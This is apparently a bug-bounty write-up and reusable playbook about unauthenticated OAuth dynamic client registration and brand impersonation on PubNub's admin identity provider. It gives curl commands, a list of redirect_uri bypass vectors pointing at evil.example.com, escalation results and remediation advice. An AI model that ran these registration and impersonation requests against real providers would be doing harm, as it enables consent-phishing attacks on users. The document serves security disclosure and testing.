# Unauthenticated OAuth Dynamic Client Registration + Client Impersonation

Worked from the PubNub engagement (2026-10-31). Target `https://admin.pubnub.com` — the Admin Dashboard,
in scope under the programme's "Admin Dashboard" clause. The same IdP fronts `mcp.pubnub.com`.

**Outcome:** one Medium finding (CVSS 5.3) drafted with its own PDF. The escalation chain did **not**
complete to a token; every control that held is documented as a negative. This file is the reusable
playbook plus the honest record of what failed.

---

## 1. Start from the discovery document, not a wordlist

One GET gives you the entire provider surface, including endpoints no scanner probes:

```bash
curl -s https://TARGET/.well-known/openid-configuration
```

PubNub's response named six endpoints and, critically, advertised
`token_endpoint_auth_methods_supported` **including `none`** — a public-client configuration that makes
anonymous registration far more useful:

```json
{
  "issuer": "https://admin.pubnub.com/oauth",
  "authorization_endpoint": "https://admin.pubnub.com/oauth/auth",
  "token_endpoint": "https://admin.pubnub.com/oauth/token",
  "userinfo_endpoint": "https://admin.pubnub.com/oauth/me",
  "registration_endpoint": "https://admin.pubnub.com/oauth/reg",
  "pushed_authorization_request_endpoint": "https://admin.pubnub.com/oauth/request",
  "end_session_endpoint": "https://admin.pubnub.com/oauth/session/end",
  "jwks_uri": "https://admin.pubnub.com/oauth/jwks",
  "scopes_supported": ["openid", "email", "profile", "offline_access"],
  "grant_types_supported": ["authorization_code", "refresh_token",
                            "urn:ietf:params:oauth:grant-type:token-exchange"],
  "token_endpoint_auth_methods_supported": ["client_secret_basic", "client_secret_jwt",
                                            "client_secret_post", "private_key_jwt", "none"],
  "code_challenge_methods_supported": ["S256"],
  "response_types_supported": ["code"],
  "request_uri_parameter_supported": false
}
```

Also worth one probe each: `/oauth/jwks` (public keys — standard, not a finding) and
`/.well-known/jwks.json` (404 here; the keys live under `/oauth/jwks`).

---

## 2. The finding: unauthenticated RFC 7591 dynamic client registration

```bash
curl -s -X POST https://admin.pubnub.com/oauth/reg \
  -H "Content-Type: application/json" \
  -d '{
        "client_name": "zzprobe-91827364",
        "redirect_uris": ["http://localhost:9999/cb"],
        "token_endpoint_auth_method": "none",
        "grant_types": ["authorization_code", "refresh_token"],
        "scope": "openid profile email offline_access"
      }'
```

HTTP 201, verbatim:

```json
{
  "application_type": "web",
  "grant_types": ["authorization_code"],
  "id_token_signed_response_alg": "RS256",
  "require_auth_time": false,
  "response_types": ["code"],
  "scope": "openid profile email offline_access",
  "subject_type": "public",
  "token_endpoint_auth_method": "none",
  "post_logout_redirect_uris": [],
  "require_pushed_authorization_requests": false,
  "dpop_bound_access_tokens": false,
  "client_id_issued_at": 1793394488,
  "client_id": "PmmlxAW8v71ouBbvd1fBohosVsLJjea_cWp7t-QSZQ_",
  "client_name": "zzprobe-91827364",
  "redirect_uris": ["http://localhost:9999/cb"],
  "registration_client_uri": "https://admin.pubnub.com/oauth/reg/PmmlxAW8v71ouBbvd1fBohosVsLJjea_cWp7t-QSZQ_",
  "registration_access_token": "P-IJ03tTaSUj0-lnZwe-4-_x2qcHb_hUk0ipfRR_UH-"
}
```

An anonymous caller receives a `client_id`, a `registration_access_token`, **and** a
`registration_client_uri` it can read back with.

### Prove the client is functional, not merely issued

Two cheap proofs, both of which matter — a rejected registration is not a finding:

**1. Authorization endpoint accepts it** (HTTP 200 serving the genuine login SPA):

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://admin.pubnub.com/oauth/auth?response_type=code\
&client_id=PmmlxAW8v71ouBbvd1fBohosVsLJjea_cWp7t-QSZQ_\
&redirect_uri=http%3A%2F%2Flocalhost%3A9999%2Fcb\
&scope=openid%20profile%20email%20offline_access\
&state=zzprobe\
&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM\
&code_challenge_method=S256"
# -> 200
```

**2. PAR endpoint accepts it** and issues a `request_uri`:

```bash
curl -s -X POST https://admin.pubnub.com/oauth/request \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=<fresh>&response_type=code&redirect_uri=http://localhost:9999/cb\
&scope=openid profile email offline_access&state=zzpar\
&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256"
# -> 201 {"expires_in":60,"request_uri":"urn:ietf:params:oauth:request_uri:XswnCmWmO73CI4osabzTjRzfcTw6rPui1xzauai8WNZ"}
```

Note the PAR endpoint requires `application/x-www-form-urlencoded`; a JSON body returns
`400 only application/x-www-form-urlencoded content-type bodies are supported on POST /request`.

### Rate-limit probe (part of the finding)

Six registrations from one unauthenticated IP, ~0.4 s apart: **6/6 succeeded**. No `X-RateLimit-*`
header on any response. Run this deliberately and record the count — "unmetered" is a separate
weakness from "unauthenticated" and both belong in the report.

---

## 3. The escalation: client-metadata impersonation

This is the part that carries the severity. The registration endpoint performs **no verification of
client identity metadata**:

```bash
curl -s -X POST https://admin.pubnub.com/oauth/reg \
  -H "Content-Type: application/json" \
  -d '{
        "client_name": "PubNub Admin Dashboard",
        "client_uri": "https://admin.pubnub.com",
        "logo_uri": "https://admin.pubnub.com/logo.png",
        "policy_uri": "https://www.pubnub.com/policies/",
        "tos_uri": "https://www.pubnub.com/terms/",
        "contacts": ["security@pubnub.com"],
        "redirect_uris": ["http://localhost:9999/cb"],
        "token_endpoint_auth_method": "none",
        "grant_types": ["authorization_code", "refresh_token"],
        "scope": "openid profile email offline_access"
      }'
```

HTTP 201, every field accepted verbatim.

### Prove persistence, not just echo

Read the client back with the issued token — if the branding returns, it is stored server-side and is
what a victim sees on a consent screen:

```bash
curl -s https://admin.pubnub.com/oauth/reg/<client_id> \
  -H "Authorization: Bearer <registration_access_token>"
```

```json
{
  "client_name": "PubNub Admin Dashboard",
  "client_uri": "https://admin.pubnub.com",
  "logo_uri": "https://admin.pubnub.com/logo.png",
  "policy_uri": "https://www.pubnub.com/policies/",
  "tos_uri": "https://www.pubnub.com/terms/",
  "contacts": ["security@pubnub.com"],
  "scope": "openid profile email offline_access"
}
```

**Validated 3x**, identical each time:

| run | `client_id` (prefix) | `client_name` | `client_uri` | `contacts` |
|---|---|---|---|---|
| 1 | `sH3KJsXn9DG4aiDnEkAtgD…` | `PubNub Admin Dashboard` | `https://admin.pubnub.com` | `["security@pubnub.com"]` |
| 2 | `WTtvbFsFe2BB3i9_2UuY3g…` | `PubNub Admin Dashboard` | `https://admin.pubnub.com` | `["security@pubnub.com"]` |
| 3 | `fMNCmDoVL3_zRvBjipOqVV…` | `PubNub Admin Dashboard` | `https://admin.pubnub.com` | `["security@pubnub.com"]` |

Note `software_id` / `software_version` are **not** honoured (silently dropped) — only the branding
fields above persist.

### Why this is the severity driver

Unlimited anonymous client creation is a nuisance. Unlimited anonymous client creation **with arbitrary
brand impersonation persisted on a production IdP** is the precondition for a consent-phishing campaign
that is indistinguishable from a genuine PubNub OAuth grant: the consent screen shows PubNub's own name,
logo, policy links and security contact address. Nothing distinguishes the attacker's client from a real
PubNub application except the `client_id`.

---

## 4. The chain-escalation battery — full results

Eleven probes run to answer "can this reach High/Critical?". **None completed.** Every row is recorded
because each one is a question the triager will ask.

| # | probe | result |
|---|---|---|
| 1 | `redirect_uri` bypass at **registration** — 22 vectors | **12 accepted at registration**: `http://evil.example.com@localhost/cb`, `http://[::1]/cb`, `http://LOCALHOST/cb`, `http://local%68ost/cb`, `http://localhost:80/cb`, `http://localhost/cb?next=https://evil.example.com`, `http://localhost\@evil.example.com/cb`, `http://localhost/cb/../../../evil`, `http://localhost//evil.example.com/cb`, `http://local\thost/cb`, `http://local\nhost/cb`, plus the localhost control. **10 blocked**: `localhost.evil.example.com`, `localhost@evil.example.com`, `[::ffff:127.0.0.1]`, `0.0.0.0`, `127.127.127.127`, `127.0.0.1.nip.io`, `localtest.me`, trailing dot, fragment, `evil.example.com/localhost/cb` |
| 2 | Does the **authorization endpoint** honour those 10 in a live flow? | **All 10 returned HTTP 200** — but every one resolves to `localhost` in a real browser. Userinfo tricks, path traversal, percent-encoding and double-slash are *parser quirks*, not redirects. **No code lands on an attacker host.** |
| 3 | `post_logout_redirect_uris` — separate field | **Accepts arbitrary domains at registration** (`https://evil.example.com/logout`, `https://admin.pubnub.com.evil.example.com/logout` both granted). `javascript:`, `data:`, relative and empty-string are rejected. |
| 4 | `end_session_endpoint` with forged `id_token_hint` | `alg:none` → `400 could not validate id_token_hint`; tampered → `400`; absent → `400`. **Signature is verified.** |
| 5 | Does `end_session_endpoint` redirect to the registered `post_logout_redirect_uri`? | **No.** Every attempt returned `400 could not validate id_token_hint` before any redirect logic ran. Could not produce an open redirect. |
| 6 | Logout CSRF | `GET /oauth/session/end` returns `200` with an auto-submitting form posting to `/oauth/session/end/confirm` carrying `xsrf` + `logout=yes`. But `POST /confirm` with empty/forged/wrong xsrf → `400 could not find logout details`, and `GET /confirm?...` → `404`. **Closed.** |
| 7 | Token-endpoint `redirect_uri` mismatch oracle | `matching`, `mismatched`, `evil`, and `omitted` **all return the identical** `400 invalid_grant`. No oracle. |
| 8 | `client_id` substitution at the token endpoint | client B's id with a bogus code → `400 invalid_grant`; an *unknown* client_id → `401 invalid_client`. Distinct, so client existence is not leaked through this path. |
| 9 | Scope escalation at registration | `openid admin`, `openid account_id`, `openid offline_access profile email account_id` → all `400 scope must only contain Authorization …`. **Blocked.** |
| 10 | Silent auth / pre-selection | `prompt=none` and `id_token_hint` requests were dropped by connection resets (transient); `max_age=0`, `login_hint`, `acr_values`, `prompt=login` all returned the ordinary login SPA with no differential. No enumeration found. |
| 11 | **Cross-finding chain** (F1 SSO oracle × F3 DCR) | F1 supplies the enterprise-customer target list (dazn.com, life360.com, vimeo.com, ptc.com); F3 supplies an indistinguishable phishing client. Passing `domain`/`sso`/`idp` params to `/oauth/auth` did **not** bounce to the customer IdP — no SSO-forced login. The chain is a *credibility* argument, not a technical one. |

### The two rules this battery teaches

**A registration-time acceptance is not a flow-time acceptance.** 12 of 22 `redirect_uri` vectors were
accepted by `/oauth/reg`. Reporting those as "redirect_uri bypass" would have been wrong — row 2 is what
settles it, and it settled against me. Always run both.

**Report the rows that failed.** "I attempted 11 escalation paths; these controls held" is what earns a
Medium its payment and pre-empts the triager's first question. It also stops the next session
re-running the same dead ends.

---

## 5. Severity wording that works

Scored `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` = **5.3 (Medium)**, with this explicit note in the report:

> I have scored this conservatively because I could not complete the chain to a stolen token — the
> redirect_uri allowlist held against every bypass I attempted. If your triage considers unauthenticated
> brand impersonation on a production IdP to raise the impact, I would welcome that reassessment.

That sentence is how a Medium gets upgraded by the vendor without you claiming a severity you cannot
demonstrate. Claiming one you cannot is what gets the report closed.

---

## 6. Remediation to recommend

1. Require authentication on `/oauth/reg` (dashboard session, API key, or initial access token). If
   public registration is genuinely needed for IDE/CLI integrations, gate it behind an allowlist of
   specific custom schemes plus a per-identity quota.
2. Rate-limit and quota registrations per IP and per identity; return `X-RateLimit-*` headers.
3. Do not issue `offline_access` by default; require explicit request and approval, and exclude it from
   clients registered without an authenticated developer identity.
4. **Verify or restrict client identity metadata.** At minimum reject `client_name`, `client_uri`,
   `logo_uri`, `policy_uri`, `tos_uri` and `contacts` values referencing the vendor's own domains, brand
   or corporate addresses when the registrant is unauthenticated. Better: do not accept branding
   metadata from anonymous registrants at all.
5. Consider `require_pushed_authorization_requests` for newly registered clients.
6. Re-check the `localhost` allowance — if local clients are needed for local development, consider
   binding them to a specific port or requiring PKCE-only public clients with short-lived codes.

---

## 7. Adjacent negatives from the same provider (do not re-test)

| surface | result |
|---|---|
| `/oauth/auth` with non-allowlisted `redirect_uri` | `400 invalid_request` for `evil.example.com`, `admin.pubnub.com.evil.example.com`, `admin.pubnub.com@evil.example.com`, `http://localhost:9999` |
| `/oauth/token` with bogus code / token-exchange / refresh | `401 invalid_client` |
| `/oauth/me` without a token | `401 invalid_token` |
| `/oauth/register`, `/oauth/authorize`, `/oauth/userinfo`, `/oauth/introspect`, `/oauth/revoke` | 404 — the real paths are `/oauth/reg`, `/oauth/auth`, `/oauth/me`, `/oauth/token`, `/oauth/request` |
| `/.well-known/jwks.json` | 404 (keys are at `/oauth/jwks`) |
| MCP `mcp.pubnub.com` | bearer required; `Bearer null` / `undefined` / `alg:none` JWT all rejected with distinct errors |
